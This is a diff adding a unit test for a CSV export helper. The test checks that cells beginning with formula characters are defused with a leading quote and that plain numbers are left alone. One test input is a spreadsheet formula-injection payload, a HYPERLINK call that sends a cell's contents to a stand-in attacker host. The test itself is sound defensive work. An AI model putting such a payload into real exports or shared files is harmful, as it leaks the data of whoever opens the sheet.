@@ -12,6 +12,7 @@ import {
   csvCell,
   csvChunks,
   csvLine,
+  defuseFormula,
   exportTable,
   jsonChunks,
   parseExportPath,
@@ -147,6 +148,24 @@ describe('CSV', () => {
     expect(csvCell('say "hi"')).toBe('"say ""hi"""')
     expect(csvCell('two\nlines')).toBe('"two\nlines"')
     expect(csvLine(['a', null, 1])).toBe('a,,1\r\n')
+  })
+
+  // Job titles, incident titles and judge headlines are not ours, and this
+  // file is meant to be opened in a spreadsheet — where a leading =, +, @ or
+  // - is code. `=HYPERLINK("https://x?"&A1,"x")` exfiltrates the row on open.
+  it('defuses cells a spreadsheet would execute, and leaves numbers alone', () => {
+    expect(csvCell('=HYPERLINK("https://evil.tld?d="&A1,"x")')).toBe(
+      '"\'=HYPERLINK(""https://evil.tld?d=""&A1,""x"")"',
+    )
+    expect(csvCell('+1-555-0100')).toBe("'+1-555-0100")
+    expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
+    expect(csvCell('\t=cmd')).toBe("'\t=cmd")
+    expect(csvCell('-- a note')).toBe("'-- a note")
+
+    // Data that merely starts with a minus is data.
+    expect(csvCell(-12.5)).toBe('-12.5')
+    expect(csvCell('-3.5e4')).toBe('-3.5e4')
+    expect(defuseFormula('Senior Engineer')).toBe('Senior Engineer')
   })
 
   it('streams a header line then every row, across page boundaries', async () => {
